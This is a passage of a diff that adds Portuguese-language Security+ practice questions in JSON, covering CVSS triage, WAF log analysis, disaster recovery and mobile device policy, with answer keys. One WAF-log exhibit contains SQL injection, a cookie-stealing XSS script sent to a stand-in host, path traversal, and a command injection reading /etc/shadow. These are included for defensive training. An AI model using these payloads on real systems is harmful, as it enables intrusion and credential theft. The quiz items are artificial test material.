+              "r2": "Microsegmentação elimina a confiança implícita mesmo entre nós da mesma rede local física.",
+              "r3": "Privilégios JIT garantem concessão de direitos efêmeros reduzindo a superfície de ataque."
+            }
+          }
+        }
+      ],
+      "scoring": {
+        "aggregate": "weighted_mean",
+        "correct_threshold": 1.0
+      },
+      "explanation": "O padrão SY0-701 (Objetivos 1.2 e 3.1) dá ênfase expressa ao NIST SP 800-207. O Control Plane engloba o Policy Engine (decisão) e o Policy Administrator (comando), além de identidade adaptativa e redução de escopo de ameaças. O Data Plane engloba o Policy Enforcement Point (execução), sujeitos (usuários/sistemas) e recursos de destino (workloads).",
+      "references": [
+        {
+          "source": "CompTIA Security+ SY0-701 Objectives",
+          "reference": "Domain 1.2: Fundamental Security Concepts (Zero Trust)"
+        },
+        {
+          "source": "Sentinel Quiz internal material",
+          "reference": "material/Modulos_sec+.md - Módulo 1"
+        }
+      ],
+      "needs_review": false,
+      "review_notes": "SME review: approved. Mapeamento preciso de arquitetura Zero Trust conforme padrão NIST SP 800-207."
+    },
+    {
+      "id": "sq_pbq_701_0011",
+      "question_format": "pbq",
+      "certification": "Security+",
+      "domain": "Threats, Vulnerabilities and Mitigations",
+      "difficulty": "Hard",
+      "language": "pt-BR",
+      "objective_codes": [
+        "2.3",
+        "4.3"
+      ],
+      "points": 3,
+      "title": "Priorização e Remediação de Vulnerabilidades com Métricas CVSS v3.1",
+      "scenario": "A equipe de segurança da MedData concluiu uma varredura de vulnerabilidades credenciada contra a infraestrutura hospitalar. O relatório identificou quatro achados críticos. Com base na severidade CVSS v3.1 (Vetor de Ataque, Complexidade, Privilégios e Impacto) e no risco operacional, ordene a prioridade de atendimento e determine a medida técnica de remediação imediata para cada ativo.",
+      "exhibits": [
+        {
+          "id": "e1",
+          "kind": "table",
+          "title": "Anexo 1 - Extrato do Relatório de Vulnerabilidades",
+          "columns": [
+            "ID",
+            "Host / IP",
+            "Serviço / Porta",
+            "Vulnerabilidade / CVE",
+            "CVSS v3.1",
+            "Vetor CVSS"
+          ],
+          "rows": [
+            {
+              "id": "v1",
+              "cells": [
+                "VULN-01",
+                "10.0.1.50 (Web Externo)",
+                "TCP 8080 (Java/Tomcat)",
+                "CVE-2021-44228 (Log4j RCE)",
+                "10.0 (Crítica)",
+                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+              ]
+            },
+            {
+              "id": "v2",
+              "cells": [
+                "VULN-02",
+                "10.0.2.10 (Arquivo Interno)",
+                "TCP 445 (SMB)",
+                "SMBv1 Ativo (MS17-010 EternalBlue)",
+                "8.1 (Alta)",
+                "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+              ]
+            },
+            {
+              "id": "v3",
+              "cells": [
+                "VULN-03",
+                "10.0.3.1 (Switch Core)",
+                "UDP 161 (SNMP)",
+                "Comunidade SNMP padrão 'public' em leitura/escrita",
+                "7.5 (Alta)",
+                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+              ]
+            },
+            {
+              "id": "v4",
+              "cells": [
+                "VULN-04",
+                "10.0.1.60 (Portal Paciente)",
+                "TCP 443 (HTTPS)",
+                "Suporte a TLS 1.0 e TLS 1.1 habilitado",
+                "5.3 (Média)",
+                "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+              ]
+            }
+          ]
+        }
+      ],
+      "tasks": [
+        {
+          "id": "t1",
+          "type": "ordering",
+          "weight": 1,
+          "prompt": "Ordene os achados de vulnerabilidade na sequência correta de prioridade de remediação (do mais crítico/urgente para o de menor risco imediato).",
+          "items": [
+            {
+              "id": "i1",
+              "text": "VULN-01: Log4j RCE remoto em servidor exposto à Internet (CVSS 10.0, AV:N, PR:N)"
+            },
+            {
+              "id": "i2",
+              "text": "VULN-02: Protocolo SMBv1 ativo em servidor de arquivos interno suscetível a worms (CVSS 8.1)"
+            },
+            {
+              "id": "i3",
+              "text": "VULN-03: Comunidade SNMP 'public' com permissão de escrita em switch central (CVSS 7.5)"
+            },
+            {
+              "id": "i4",
+              "text": "VULN-04: Cifras legadas TLS 1.0/1.1 em servidor web interno (CVSS 5.3)"
+            }
+          ],
+          "solution": {
+            "order": [
+              "i1",
+              "i2",
+              "i3",
+              "i4"
+            ]
+          },
+          "scoring": {
+            "method": "exact"
+          },
+          "explanation": {
+            "summary": "A priorização segue a pontuação CVSS e a exposição externa imediata (RCE remoto sem privilégios em primeiro lugar).",
+            "per_item": {
+              "i1": "VULN-01 possui CVSS 10.0 máximo e execução remota de código pela Internet sem autenticação.",
+              "i2": "VULN-02 permite movimentação lateral automatizada por ransomware em rede adjacente.",
+              "i3": "VULN-03 expõe alteração de configuração de rede via protocolo de gerência sem autenticação forte.",
+              "i4": "VULN-04 requer alta complexidade de ataque e mitigação via configuração de protocolos modernos."
+            }
+          }
+        },
+        {
+          "id": "t2",
+          "type": "table_form",
+          "weight": 2,
+          "prompt": "Selecione a ação técnica corretiva recomendada para neutralizar definitivamente cada vulnerabilidade encontrada.",
+          "columns": [
+            {
+              "id": "vuln_id",
+              "label": "Vulnerabilidade"
+            },
+            {
+              "id": "remediation_action",
+              "label": "Ação de Remediação Recomendada",
+              "input_type": "select",
+              "choices": [
+                "Atualizar biblioteca para versão corrigida ou desativar busca JNDI",
+                "Desabilitar o protocolo SMBv1 no sistema e forçar SMBv3 assinado",
+                "Migrar para SNMPv3 com autenticação SHA e criptografia AES, desativando v1/v2c",
+                "Desabilitar TLS 1.0/1.1 e impor suites seguras com TLS 1.2 e TLS 1.3"
+              ]
+            }
+          ],
+          "rows": [
+            {
+              "id": "r1",
+              "label": "VULN-01 (CVE-2021-44228)",
+              "cells": {
+                "vuln_id": {
+                  "editable": false,
+                  "value": "VULN-01 (CVE-2021-44228)"
+                },
+                "remediation_action": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Atualizar biblioteca para versão corrigida ou desativar busca JNDI",
+                    "Desabilitar o protocolo SMBv1 no sistema e forçar SMBv3 assinado",
+                    "Migrar para SNMPv3 com autenticação SHA e criptografia AES, desativando v1/v2c",
+                    "Desabilitar TLS 1.0/1.1 e impor suites seguras com TLS 1.2 e TLS 1.3"
+                  ]
+                }
+              }
+            },
+            {
+              "id": "r2",
+              "label": "VULN-02 (SMBv1 MS17-010)",
+              "cells": {
+                "vuln_id": {
+                  "editable": false,
+                  "value": "VULN-02 (SMBv1 MS17-010)"
+                },
+                "remediation_action": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Atualizar biblioteca para versão corrigida ou desativar busca JNDI",
+                    "Desabilitar o protocolo SMBv1 no sistema e forçar SMBv3 assinado",
+                    "Migrar para SNMPv3 com autenticação SHA e criptografia AES, desativando v1/v2c",
+                    "Desabilitar TLS 1.0/1.1 e impor suites seguras com TLS 1.2 e TLS 1.3"
+                  ]
+                }
+              }
+            },
+            {
+              "id": "r3",
+              "label": "VULN-03 (SNMP Community)",
+              "cells": {
+                "vuln_id": {
+                  "editable": false,
+                  "value": "VULN-03 (SNMP Community)"
+                },
+                "remediation_action": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Atualizar biblioteca para versão corrigida ou desativar busca JNDI",
+                    "Desabilitar o protocolo SMBv1 no sistema e forçar SMBv3 assinado",
+                    "Migrar para SNMPv3 com autenticação SHA e criptografia AES, desativando v1/v2c",
+                    "Desabilitar TLS 1.0/1.1 e impor suites seguras com TLS 1.2 e TLS 1.3"
+                  ]
+                }
+              }
+            },
+            {
+              "id": "r4",
+              "label": "VULN-04 (TLS 1.0/1.1)",
+              "cells": {
+                "vuln_id": {
+                  "editable": false,
+                  "value": "VULN-04 (TLS 1.0/1.1)"
+                },
+                "remediation_action": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Atualizar biblioteca para versão corrigida ou desativar busca JNDI",
+                    "Desabilitar o protocolo SMBv1 no sistema e forçar SMBv3 assinado",
+                    "Migrar para SNMPv3 com autenticação SHA e criptografia AES, desativando v1/v2c",
+                    "Desabilitar TLS 1.0/1.1 e impor suites seguras com TLS 1.2 e TLS 1.3"
+                  ]
+                }
+              }
+            }
+          ],
+          "solution": {
+            "cells": {
+              "r1": {
+                "remediation_action": {
+                  "accepted": [
+                    "Atualizar biblioteca para versão corrigida ou desativar busca JNDI"
+                  ]
+                }
+              },
+              "r2": {
+                "remediation_action": {
+                  "accepted": [
+                    "Desabilitar o protocolo SMBv1 no sistema e forçar SMBv3 assinado"
+                  ]
+                }
+              },
+              "r3": {
+                "remediation_action": {
+                  "accepted": [
+                    "Migrar para SNMPv3 com autenticação SHA e criptografia AES, desativando v1/v2c"
+                  ]
+                }
+              },
+              "r4": {
+                "remediation_action": {
+                  "accepted": [
+                    "Desabilitar TLS 1.0/1.1 e impor suites seguras com TLS 1.2 e TLS 1.3"
+                  ]
+                }
+              }
+            }
+          },
+          "scoring": {
+            "method": "per_cell"
+          },
+          "explanation": {
+            "summary": "Remediações específicas eliminam a raiz da vulnerabilidade através de patching, desativação de protocolo ou upgrade.",
+            "per_item": {
+              "r1": "Log4j é corrigido atualizando a dependência para versão com mitigação JNDI.",
+              "r2": "SMBv1 é inerentemente inseguro e deve ser desativado permanentemente em favor de SMBv3.",
+              "r3": "SNMPv1/v2c trafegam em texto claro; SNMPv3 provê integridade e cifragem.",
+              "r4": "Protocolos anteriores a TLS 1.2 devem ser desativados para prevenir ataques como BEAST e POODLE."
+            }
+          }
+        }
+      ],
+      "scoring": {
+        "aggregate": "weighted_mean",
+        "correct_threshold": 1.0
+      },
+      "explanation": "A análise de relatórios de vulnerabilidades e remediação é um dos tópicos mais frequentes em PBQs no exame SY0-701 (Domínios 2.3 e 4.3). O candidato deve saber interpretar vetores de ataque CVSS v3.1 (Network vs Adjacent), entender que vulnerabilidades exploráveis pela Internet sem privilégios têm prioridade máxima, e selecionar a remediação técnica definitiva (patching, desativação de protocolos legados ou transição para protocolos seguros como SNMPv3 e TLS 1.3).",
+      "references": [
+        {
+          "source": "CompTIA Security+ SY0-701 Objectives",
+          "reference": "Domain 2.3: Vulnerability Management / Domain 4.3: Vulnerability Scanning"
+        },
+        {
+          "source": "Sentinel Quiz internal material",
+          "reference": "material/Modulos_sec+.md - Módulo 17"
+        }
+      ],
+      "needs_review": false,
+      "review_notes": "SME review: approved. Exercício prático de triagem e remediação de relatório de vulnerabilidades CVSS."
+    },
+    {
+      "id": "sq_pbq_701_0012",
+      "question_format": "pbq",
+      "certification": "Security+",
+      "domain": "Security Operations",
+      "difficulty": "Hard",
+      "language": "pt-BR",
+      "objective_codes": [
+        "2.4",
+        "4.5"
+      ],
+      "points": 3,
+      "title": "Inspeção de Ataques a Aplicações Web e Regras de WAF (OWASP Top 10)",
+      "scenario": "A plataforma de e-commerce MegaShop sofreu lentidão atípica e alertas de integridade no banco de dados. Como Analista de SOC nível 2, você extraiu o log consolidado do Web Application Firewall (WAF) do Anexo 1. Identifique as requisições que representam ataques reais e configure a associação correta entre vulnerabilidades e regras de mitigação preventiva no WAF.",
+      "exhibits": [
+        {
+          "id": "e1",
+          "kind": "log",
+          "title": "Anexo 1 - Log de Requisições HTTP do WAF",
+          "lines": [
+            {
+              "id": "l1",
+              "text": "2026-09-30 14:02:10 192.0.2.45 GET /products/view?id=452 HTTP/1.1 200 OK"
+            },
+            {
+              "id": "l2",
+              "text": "2026-09-30 14:02:18 198.51.100.89 GET /search?q=%27+UNION+SELECT+null%2Cusername%2Cpassword_hash+FROM+users-- HTTP/1.1 500 Internal Error"
+            },
+            {
+              "id": "l3",
+              "text": "2026-09-30 14:03:02 192.0.2.60 POST /login HTTP/1.1 200 OK user=jdoe"
+            },
+            {
+              "id": "l4",
+              "text": "2026-09-30 14:03:45 203.0.113.12 POST /comments/new HTTP/1.1 200 OK comment=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fbad.org%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E"
+            },
+            {
+              "id": "l5",
+              "text": "2026-09-30 14:04:15 203.0.113.33 GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1 403 Forbidden"
+            },
+            {
+              "id": "l6",
+              "text": "2026-09-30 14:04:50 198.51.100.99 POST /api/ping HTTP/1.1 200 OK host=127.0.0.1%3B+cat+%2Fetc%2Fshadow"
+            },
+            {
+              "id": "l7",
+              "text": "2026-09-30 14:05:12 192.0.2.88 GET /assets/style.css HTTP/1.1 304 Not Modified"
+            }
+          ]
+        }
+      ],
+      "tasks": [
+        {
+          "id": "t1",
+          "type": "select_in_exhibit",
+          "weight": 1,
+          "prompt": "Selecione TODAS as linhas do log que contêm tentativas ativas de injeção ou acesso não autorizado a arquivos do sistema.",
+          "exhibit_id": "e1",
+          "select_mode": "multiple",
+          "solution": {
+            "selected": [
+              "l2",
+              "l4",
+              "l5",
+              "l6"
+            ]
+          },
+          "scoring": {
+            "method": "tp_minus_fp"
+          },
+          "explanation": {
+            "summary": "As linhas l2, l4, l5 e l6 contêm ataques clássicos da Web (SQLi, Stored XSS, Directory Traversal e Command Injection).",
+            "per_item": {
+              "l2": "Linha l2: Injeção SQL explorando cláusula UNION SELECT.",
+              "l4": "Linha l4: Cross-Site Scripting (XSS) injetando script para roubo de sessão/cookies.",
+              "l5": "Linha l5: Path / Directory Traversal tentando ler /etc/passwd via '../'.",
+              "l6": "Linha l6: Injeção de comandos do SO (Command Injection) encadeando comando com ponto e vírgula."
+            }
+          }
+        },
+        {
+          "id": "t2",
+          "type": "matching",
+          "weight": 2,
+          "prompt": "Associe cada payload identificado (à esquerda) à sua respectiva categoria OWASP e contramedida de segurança recomendada (à direita).",
+          "left": [
+            {
+              "id": "p1",
+              "text": "UNION SELECT null, username, password_hash FROM users--"
+            },
+            {
+              "id": "p2",
+              "text": "<script>document.location='http://bad.org/steal?cookie='+document.cookie</script>"
+            },
+            {
+              "id": "p3",
+              "text": "GET /download?file=../../../../etc/passwd"
+            },
+            {
+              "id": "p4",
+              "text": "host=127.0.0.1; cat /etc/shadow"
+            }
+          ],
+          "right": [
+            {
+              "id": "c1",
+              "text": "SQL Injection (SQLi) — Aplicar Prepared Statements / Consultas Parametrizadas e ORM"
+            },
+            {
+              "id": "c2",
+              "text": "Cross-Site Scripting (XSS) — Implementar codificação de saída sensível ao contexto (Output Encoding) e CSP"
+            },
+            {
+              "id": "c3",
+              "text": "Directory Traversal — Validar nomes de arquivo contra allowlist estrita e isolar caminhos em chroot"
+            },
+            {
+              "id": "c4",
+              "text": "Command Injection — Evitar chamadas diretas a shell do SO e validar entrada com regex estrita"
+            }
+          ],
+          "solution": {
+            "pairs": {
+              "p1": "c1",
+              "p2": "c2",
+              "p3": "c3",
+              "p4": "c4"
+            }
+          },
+          "scoring": {
+            "method": "per_pair"
+          },
+          "explanation": {
+            "summary": "Defesas em profundidade combinam filtragem em WAF com práticas de desenvolvimento seguro (Secure by Design).",
+            "per_item": {
+              "p1": "SQLi é neutralizado na raiz por parametrização de consultas.",
+              "p2": "XSS é mitigado por sanitização/encoding de saída e Content Security Policy (CSP).",
+              "p3": "Directory traversal requer canonicalização de caminhos e validação contra diretório raiz restrito.",
+              "p4": "Command injection deve ser impedido desacoplando a lógica da aplicação do terminal shell."
+            }
+          }
+        }
+      ],
+      "scoring": {
+        "aggregate": "weighted_mean",
+        "correct_threshold": 1.0
+      },
+      "explanation": "A análise de requisições maliciosas é essencial no exame CompTIA Security+ SY0-701 (Objetivos 2.4 e 4.5). O candidato deve distinguir claramente assinaturas de SQLi (cláusulas SQL), XSS (tags de script e roubo de cookies), Directory Traversal (caracteres ../ para fuga de diretório) e Command Injection (separadores de comando de shell como ';', '&&' ou '|').",
+      "references": [
+        {
+          "source": "CompTIA Security+ SY0-701 Objectives",
+          "reference": "Domain 2.4: Common Vulnerabilities / Domain 4.5: Application Security"
+        },
+        {
+          "source": "Sentinel Quiz internal material",
+          "reference": "material/Modulos_sec+.md - Módulo 17"
+        }
+      ],
+      "needs_review": false,
+      "review_notes": "SME review: approved. PBQ prática de análise de logs WAF e classificação de vulnerabilidades OWASP Top 10."
+    },
+    {
+      "id": "sq_pbq_701_0013",
+      "question_format": "pbq",
+      "certification": "Security+",
+      "domain": "Security Program Management and Oversight",
+      "difficulty": "Hard",
+      "language": "pt-BR",
+      "objective_codes": [
+        "3.4",
+        "5.3"
+      ],
+      "points": 3,
+      "title": "Continuidade de Negócios: Dimensionamento de RTO, RPO e Estratégia de Backup",
+      "scenario": "O comitê de continuidade de negócios da Seguradora Alvorada definiu novos requisitos de Disaster Recovery (DR) para dois sistemas vitais: o Sistema de Emissão de Apólices (Missão Crítica) e o Portal Histórico de Sinistros (Suporte Operacional). Com base nos Acordos de Nível de Serviço (SLAs) e nas métricas de resiliência, configure a arquitetura de recuperação e classifique as alternativas de contingência.",
+      "tasks": [
+        {
+          "id": "t1",
+          "type": "table_form",
+          "weight": 2,
+          "prompt": "Selecione as metas de recuperação, tipo de replicação e tecnologia de backup adequadas para atender aos SLAs de cada sistema.",
+          "columns": [
+            {
+              "id": "system_name",
+              "label": "Sistema / Criticidade"
+            },
+            {
+              "id": "rpo_target",
+              "label": "Tolerância Máxima a Perda de Dados (RPO)",
+              "input_type": "select",
+              "choices": [
+                "RPO <= 15 minutos",
+                "RPO <= 24 horas",
+                "RPO = 7 dias"
+              ]
+            },
+            {
+              "id": "rto_target",
+              "label": "Meta de Tempo de Retorno (RTO)",
+              "input_type": "select",
+              "choices": [
+                "RTO <= 2 horas",
+                "RTO <= 24 horas",
+                "RTO = 1 semana"
+              ]
+            },
+            {
+              "id": "replication_strategy",
+              "label": "Estratégia de Cópia / Replicação",
+              "input_type": "select",
+              "choices": [
+                "Replicação síncrona / quase-síncrona com snapshots contínuos",
+                "Backup diferencial diário com full semanal",
+                "Backup mensal em fita magnética arquivada offsite"
+              ]
+            }
+          ],
+          "rows": [
+            {
+              "id": "r1",
+              "label": "Emissão de Apólices (Missão Crítica)",
+              "cells": {
+                "system_name": {
+                  "editable": false,
+                  "value": "Emissão de Apólices (Missão Crítica)"
+                },
+                "rpo_target": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "RPO <= 15 minutos",
+                    "RPO <= 24 horas",
+                    "RPO = 7 dias"
+                  ]
+                },
+                "rto_target": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "RTO <= 2 horas",
+                    "RTO <= 24 horas",
+                    "RTO = 1 semana"
+                  ]
+                },
+                "replication_strategy": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Replicação síncrona / quase-síncrona com snapshots contínuos",
+                    "Backup diferencial diário com full semanal",
+                    "Backup mensal em fita magnética arquivada offsite"
+                  ]
+                }
+              }
+            },
+            {
+              "id": "r2",
+              "label": "Portal Histórico (Suporte Operacional)",
+              "cells": {
+                "system_name": {
+                  "editable": false,
+                  "value": "Portal Histórico (Suporte Operacional)"
+                },
+                "rpo_target": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "RPO <= 15 minutos",
+                    "RPO <= 24 horas",
+                    "RPO = 7 dias"
+                  ]
+                },
+                "rto_target": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "RTO <= 2 horas",
+                    "RTO <= 24 horas",
+                    "RTO = 1 semana"
+                  ]
+                },
+                "replication_strategy": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Replicação síncrona / quase-síncrona com snapshots contínuos",
+                    "Backup diferencial diário com full semanal",
+                    "Backup mensal em fita magnética arquivada offsite"
+                  ]
+                }
+              }
+            }
+          ],
+          "solution": {
+            "cells": {
+              "r1": {
+                "rpo_target": {
+                  "accepted": [
+                    "RPO <= 15 minutos"
+                  ]
+                },
+                "rto_target": {
+                  "accepted": [
+                    "RTO <= 2 horas"
+                  ]
+                },
+                "replication_strategy": {
+                  "accepted": [
+                    "Replicação síncrona / quase-síncrona com snapshots contínuos"
+                  ]
+                }
+              },
+              "r2": {
+                "rpo_target": {
+                  "accepted": [
+                    "RPO <= 24 horas"
+                  ]
+                },
+                "rto_target": {
+                  "accepted": [
+                    "RTO <= 24 horas"
+                  ]
+                },
+                "replication_strategy": {
+                  "accepted": [
+                    "Backup diferencial diário com full semanal"
+                  ]
+                }
+              }
+            }
+          },
+          "scoring": {
+            "method": "per_cell"
+          },
+          "explanation": {
+            "summary": "Sistemas de missão crítica exigem RTO/RPO muito baixos sustentados por replicação contínua; sistemas de suporte suportam janelas maiores.",
+            "per_item": {
+              "r1": "Missão crítica demanda restauração imediata (RTO <= 2h) e mínima perda de transações (RPO <= 15min).",
+              "r2": "Sistemas de consulta histórica toleram perda do dia e restauração em até 24 horas."
+            }
+          }
+        },
+        {
+          "id": "t2",
+          "type": "categorization",
+          "weight": 1,
+          "prompt": "Classifique as características dos locais de contingência de desastres (Disaster Recovery Sites).",
+          "buckets": [
+            {
+              "id": "hot_site",
+              "label": "Hot Site"
+            },
+            {
+              "id": "warm_site",
+              "label": "Warm Site"
+            },
+            {
+              "id": "cold_site",
+              "label": "Cold Site"
+            }
+          ],
+          "items": [
+            {
+              "id": "i1",
+              "text": "Site totalmente equipado com hardware idêntico e dados replicados em tempo real; failover em minutos"
+            },
+            {
+              "id": "i2",
+              "text": "Espaço físico com energia e refrigeração, mas sem computadores ou dados pré-instalados; recuperação em semanas"
+            },
+            {
+              "id": "i3",
+              "text": "Infraestrutura com hardware pré-configurado, necessitando restauração do último backup para ativação (horas a dias)"
+            }
+          ],
+          "solution": {
+            "assignment": {
+              "i1": "hot_site",
+              "i2": "cold_site",
+              "i3": "warm_site"
+            }
+          },
+          "scoring": {
+            "method": "per_item"
+          },
+          "explanation": {
+            "summary": "Hot Site prioriza tempo de recuperação (RTO mínimo); Cold Site prioriza baixo custo financeiro; Warm Site é intermediário.",
+            "per_item": {
+              "i1": "Hot site: pronto para assumir produção imediatamente com dados sincronizados.",
+              "i2": "Cold site: apenas infraestrutura básica de instalações físicas.",
+              "i3": "Warm site: possui hardware básico, requer carregamento manual dos dados."
+            }
+          }
+        }
+      ],
+      "scoring": {
+        "aggregate": "weighted_mean",
+        "correct_threshold": 1.0
+      },
+      "explanation": "No exame CompTIA Security+ SY0-701 (Objetivos 3.4 e 5.3), a gestão de continuidade de negócios depende do entendimento exato de RPO (Recovery Point Objective - perda máxima aceitável de dados no tempo) e RTO (Recovery Time Objective - tempo máximo aceitável para restauração da operação). A escolha de locais de contingência (Hot vs Warm vs Cold) balanceia o custo financeiro com a exigência dos SLAs do negócio.",
+      "references": [
+        {
+          "source": "CompTIA Security+ SY0-701 Objectives",
+          "reference": "Domain 3.4: Resilience and Redundancy / Domain 5.3: Disaster Recovery"
+        },
+        {
+          "source": "Sentinel Quiz internal material",
+          "reference": "material/Modulos_sec+.md - Módulo 13"
+        }
+      ],
+      "needs_review": false,
+      "review_notes": "SME review: approved. Cenário prático de dimensionamento de RTO, RPO e locais de contingência."
+    },
+    {
+      "id": "sq_pbq_701_0014",
+      "question_format": "pbq",
+      "certification": "Security+",
+      "domain": "Security Architecture",
+      "difficulty": "Hard",
+      "language": "pt-BR",
+      "objective_codes": [
+        "3.1",
+        "4.2"
+      ],
+      "points": 3,
+      "title": "Hardening de Mobilidade Corporativa: Políticas de MDM/MAM e Modelos BYOD vs COPE",
+      "scenario": "A diretoria jurídica e de compliance da GlobalLegal aprovou uma iniciativa de trabalho híbrido com adoção de smartphones pessoais dos advogados (BYOD) e dispositivos exclusivos fornecidos pela empresa (COPE). Configure as diretivas de segurança no servidor de MDM/MAM para garantir o isolamento estrito de documentos de clientes sem violar a privacidade dos usuários.",
+      "tasks": [
+        {
+          "id": "t1",
+          "type": "table_form",
+          "weight": 2,
+          "prompt": "Selecione a ação de segurança adequada para cada política do sistema de gerenciamento de dispositivos móveis.",
+          "columns": [
+            {
+              "id": "policy_item",
+              "label": "Política de Segurança"
+            },
+            {
+              "id": "byod_config",
+              "label": "Configuração no Perfil BYOD (Pessoal)",
+              "input_type": "select",
+              "choices": [
+                "Selective Wipe (apagar apenas o contêiner corporativo)",
+                "Full Device Wipe (restaurar padrão de fábrica)",
+                "Permitir sem restrições de isolamento"
+              ]
+            },
+            {
+              "id": "cope_config",
+              "label": "Configuração no Perfil COPE (Corporativo)",
+              "input_type": "select",
+              "choices": [
+                "Full Device Wipe autorizado em caso de perda ou roubo",
+                "Bloqueio de Selective Wipe",
+                "Desativação de senha de bloqueio"
+              ]
+            }
+          ],
+          "rows": [
+            {
+              "id": "r1",
+              "label": "Procedimento em caso de perda, furto ou rescisão de contrato",
+              "cells": {
+                "policy_item": {
+                  "editable": false,
+                  "value": "Procedimento em caso de perda, furto ou rescisão de contrato"
+                },
+                "byod_config": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Selective Wipe (apagar apenas o contêiner corporativo)",
+                    "Full Device Wipe (restaurar padrão de fábrica)",
+                    "Permitir sem restrições de isolamento"
+                  ]
+                },
+                "cope_config": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Full Device Wipe autorizado em caso de perda ou roubo",
+                    "Bloqueio de Selective Wipe",
+                    "Desativação de senha de bloqueio"
+                  ]
+                }
+              }
+            }
+          ],
+          "solution": {
+            "cells": {
+              "r1": {
+                "byod_config": {
+                  "accepted": [
+                    "Selective Wipe (apagar apenas o contêiner corporativo)"
+                  ]
+                },
+                "cope_config": {
+                  "accepted": [
+                    "Full Device Wipe autorizado em caso de perda ou roubo"
+                  ]
+                }
+              }
+            }
+          },
+          "scoring": {
+            "method": "per_cell"
+          },
+          "explanation": {
+            "summary": "Dispositivos pessoais exigem Selective Wipe para preservar dados pessoais; dispositivos corporativos permitem Full Wipe.",
+            "per_item": {
+              "r1": "Selective Wipe elimina apenas chaves e contêineres de aplicativos corporativos (MAM), respeitando fotos e apps pessoais."
+            }
+          }
+        },
+        {
+          "id": "t2",
+          "type": "categorization",
+          "weight": 1,
+          "prompt": "Classifique cada funcionalidade de segurança móvel pelo seu objetivo de governança e controle.",
+          "buckets": [
+            {
+              "id": "data_protection",
+              "label": "Proteção de Dados e Prevenção de Fuga (DLP)"
+            },
+            {
+              "id": "device_posture",
+              "label": "Verificação de Postura e Integridade do Dispositivo"
+            }
+          ],
+          "items": [
+            {
+              "id": "i1",
+              "text": "Containerização (armazenamento criptografado segregando apps pessoais dos corporativos)"
+            },
+            {
+              "id": "i2",
+              "text": "Detecção de Jailbreak / Rooting que revoga acesso ao detectar quebra de sandbox do SO"
+            },
+            {
+              "id": "i3",
+              "text": "Bloqueio de transferência de área de transferência (Copiar/Colar) entre apps corporativos e pessoais"
+            },
+            {
+              "id": "i4",
+              "text": "Bloqueio de Sideloading (impedir instalação de APKs fora da loja oficial gerenciada)"
+            }
+          ],
+          "solution": {
+            "assignment": {
+              "i1": "data_protection",
+              "i2": "device_posture",
+              "i3": "data_protection",
+              "i4": "device_posture"
+            }
+          },
+          "scoring": {
+            "method": "per_item"
+          },
+          "explanation": {
+            "summary": "A separação de dados evita exfiltração; a validação de postura assegura que o sistema operacional móvel não foi comprometido.",
+            "per_item": {
+              "i1": "Containerização protege o ciclo de vida dos dados em repouso.",
+              "i2": "Detecção de jailbreak/root avalia a higidez de segurança do dispositivo.",
+              "i3": "Bloqueio de copiar/colar é controle clássico de DLP móvel.",
+              "i4": "Impedir sideloading impede a introdução de trojans através de pacotes não assinados."
+            }
+          }
+        }
+      ],
+      "scoring": {
+        "aggregate": "weighted_mean",
+        "correct_threshold": 1.0
+      },
+      "explanation": "O gerenciamento de mobilidade corporativa (MDM/MAM) é tema central no exame CompTIA Security+ SY0-701 (Objetivos 3.1 e 4.2). Em modelos BYOD, a organização não possui autorização legal para realizar Full Wipe (apagar fotos, mensagens e dados pessoais); deve-se aplicar Selective/Enterprise Wipe no contêiner corporativo. Em contrapartida, controles de integridade (anti-jailbreak, bloqueio de sideloading e biometria) devem ser exigidos em qualquer dispositivo que acesse recursos corporativos.",
+      "references": [
+        {
+          "source": "CompTIA Security+ SY0-701 Objectives",
+          "reference": "Domain 3.1: Architecture / Domain 4.2: Endpoint Security"
+        },
+        {
+          "source": "Sentinel Quiz internal material",
+          "reference": "material/Modulos_sec+.md - Módulo 15"
+        }
+      ],
+      "needs_review": false,
+      "review_notes": "SME review: approved. Políticas de MDM, MAM, BYOD e controles de integridade móvel."
+    },
+    {
+      "id": "sq_pbq_701_0015",
+      "question_format": "pbq",
+      "certification": "Security+",
+      "domain": "Security Operations",
+      "difficulty": "Hard",
+      "language": "pt-BR",
+      "objective_codes": [
+        "4.4",
+        "4.5"
+      ],
+      "points": 3,
+      "title": "Análise Forense de Tráfego de Rede (PCAP, DNS Tunneling e ARP Spoofing)",
+      "scenario": "O sensor IDS de rede disparou alertas de anomalia de protocolo. Como analista de resposta a incidentes, você abriu o extrato da captura de pacotes (PCAP) no Anexo 1. Identifique as evidências de exfiltração oculta de dados e selecione as contramedidas técnicas adequadas de camada 2 e de resolução de nomes.",
+      "exhibits": [
+        {
+          "id": "e1",
+          "kind": "log",
+          "title": "Anexo 1 - Extrato da Captura de Pacotes de Rede (PCAP Summary)",
+          "lines": [
+            {
+              "id": "l1",
+              "text": "No. 1 10.0.1.25 -> 10.0.1.1 ARP 42 Who has 10.0.1.1? Tell 10.0.1.25"
+            },
+            {
+              "id": "l2",
+              "text": "No. 2 10.0.1.250 -> 10.0.1.25 ARP 42 10.0.1.1 is at 00:11:22:33:44:55 (Gratuitous / Unsolicited)"
+            },
+            {
+              "id": "l3",
